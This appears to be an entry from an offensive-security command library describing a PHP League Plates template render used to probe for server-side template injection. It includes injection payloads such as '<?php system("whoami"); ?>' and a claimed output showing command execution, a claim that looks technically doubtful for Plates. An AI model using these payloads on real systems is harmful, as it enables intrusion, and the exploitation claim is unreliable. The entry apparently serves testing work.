---
id: ef82b492-fa77-4d42-a3a9-9ffbc14ce803
name: php-render-plates-template
type: command
executor: php
data: >-
  $templates = new League\Plates\Engine('/path/to/templates'); echo
  $templates->render('profile', ['name' => '$_NAME_VALUE']);
output: null
created_at: '2023-04-06T03:56:40.469114+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - PHP
tags:
  - ssti
  - plates
  - render
verified: true
validated: true
---

# php-render-plates-template

## Command

```php
$templates = new League\Plates\Engine('/path/to/templates'); echo $templates->render('profile', ['name' => '$_NAME_VALUE']);
```

## Description

This command invokes PHP to create a Plates templating engine instance and renders a specified template with variables. Use it to test template rendering in a vulnerable application context, where $_NAME_VALUE can be replaced with an injected payload for SSTI exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `/path/to/templates` | Directory path containing template files (e.g., .php templates) | Yes |
| `profile` | Name of the template file (without .php extension) | Yes |
| `$_NAME_VALUE` | Value for the 'name' variable passed to the template; substitute with payload for exploitation (e.g., '<?php system("id"); ?>') | Yes |

## Examples

### Basic Usage

```php
$templates = new League\Plates\Engine('/var/www/templates'); echo $templates->render('profile', ['name' => 'Test User']);
```

Renders the profile template with safe 'name' value.

### Advanced Usage (Exploitation Test)

```php
$templates = new League\Plates\Engine('/var/www/templates'); echo $templates->render('profile', ['name' => '<?php system("whoami"); ?>']);
```

Injects PHP payload; if template lacks escaping, executes the command.

## Expected Output

Successful render outputs the processed template HTML/PHP. For exploitation:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hello, [executed output]User
```

If no execution, plain text reflection or parse error.

## Related

- [[procedures/Exploit-SSTI-in-Plates-PHP-Templating-Engine]]
- [[codes/plates-engine-render-template]]
